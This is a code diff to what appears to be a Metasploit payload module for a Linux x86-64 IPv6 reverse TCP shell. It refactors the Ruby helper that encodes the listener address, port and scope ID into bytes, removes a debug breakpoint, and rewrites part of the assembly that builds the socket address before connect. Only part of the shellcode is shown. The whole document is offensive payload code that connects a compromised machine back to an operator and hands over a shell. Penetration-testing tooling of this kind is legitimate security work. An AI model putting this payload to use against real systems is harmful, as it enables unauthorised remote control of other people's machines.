@@ -9,7 +9,7 @@ require 'msf/base/sessions/command_shell_options'
 
 module MetasploitModule
 
-  CachedSize = 105
+  CachedSize = 90
 
   include Msf::Payload::Single
   include Msf::Payload::Linux
@@ -31,24 +31,29 @@ module MetasploitModule
       ])
   end
 
+  def convert_input(value, padding, reverse=false)
+      # converts value to comma separated string of 
+      # zero-padded bytes to be used in the db instruction 
+      arr = value.to_s(16).rjust(padding, "0").scan(/../)
+
+      if reverse
+        arr = arr.reverse
+      end
+
+      arr.map{ |x| sprintf("0x%02x", x.hex) }.join(',')
+  end
+
   def generate_stage
-      # tcp port conversion
-      port_order = ([1,0]) # byte ordering
-      tcp_port = [datastore['LPORT'].to_i].pack('n*').unpack('H*').to_s.scan(/../) # converts user input into integer and unpacked into a string array
-      tcp_port.pop     # removes the first useless / from  the array
-      tcp_port.shift   # removes the last useless  / from  the array
-      tcp_port = (port_order.map{|x| tcp_port[x]}).join('') # reorder the array and convert it to a string.
+      # 22 -> "0x00,0x16"
+      # 4444 -> "0x11,0x5c" 
+      tcp_port = convert_input(datastore['LPORT'], 4)
 
-      # apply same alterations to SCOPEID that were done to LPORT
-      scope_id = [datastore['SCOPEID'].to_i].pack('n*').unpack('H*').to_s.scan(/../)
-      scope_id.pop
-      scope_id.shift
-      scope_id = (port_order.map{|x| scope_id[x]}).join('')
+      # 0 -> "0x00,0x00,0x00,0x00"
+      scope_id = convert_input(datastore['SCOPEID'], 8, true)
 
-      # ipv6 address conversion
-      # converts user's input into ipv6 hex representation
-      qwords = IPAddr.new(datastore['LHOST'], Socket::AF_INET6).hton.scan(/......../).map {|i| i.unpack('V').first.to_s(16)}
-      binding.pry
+      # ::1 -> "0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01"
+      # dead:beef:2::1009 -> "0xde,0xad,0xbe,0xef,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x10,0x09"
+      ipv6_addr = convert_input(IPAddr.new(datastore['LHOST'], Socket::AF_INET6).to_i, 32) 
 
       payload = <<-EOS
         socket_call:
@@ -65,8 +70,9 @@ module MetasploitModule
 
             push   rax
             pop    rdi                          ; store socket fd 
+            jmp get_address                     ; jmp-call-pop
 
-        ;populate_sockaddr_in6:
+        populate_sockaddr_in6:
             ; struct sockaddr_in6 {
             ;     sa_family_t     sin6_family;   /* AF_INET6 */
             ;     in_port_t       sin6_port;     /* port number */
@@ -79,21 +85,6 @@ module MetasploitModule
             ;     unsigned char   s6_addr[16];   /* IPv6 address */
             ; };
 
-            ; assumption: rax contains result of socket syscall, use it to
-            ; zero out rdx via sign extension
-            ;cdq
-            ;push rdx
-            ;push rdx
-            ;push rdx
-            ;push rdx                            ; 32 bytes of 0s
-            ;mov [rsp], 0x#{tcp_port}000a        ; sin6_port/sin6_family
-            ;mov [rsp + 0x8], 0x#{qwords[0]}
-            ;mov [rsp + 0x10], 0x#{qwords[1]}
-            ;mov [rsp + 0x14], 0x#{scope_id}
-
-            ;push rsp
-            jmp get_address                     ; jmp-call-pop
-        populate_sockaddr_in6:
             pop rsi                             ; store pointer to struct
 
         connect_call:
@@ -134,7 +125,7 @@ module MetasploitModule
         get_address:
             call populate_sockaddr_in6
             ; sin6_family(2), sin6_port(2), sin6_flowinfo(4), sockaddr_in6(16), sin6_scope_id(4)
-            db "\x0a\x00
+            db 0x0a,0x00,#{tcp_port},0x00,0x00,0x00,0x00,#{ipv6_addr},#{scope_id}
       EOS
 
       Metasm::Shellcode.assemble(Metasm::X86_64.new, payload).encode_string
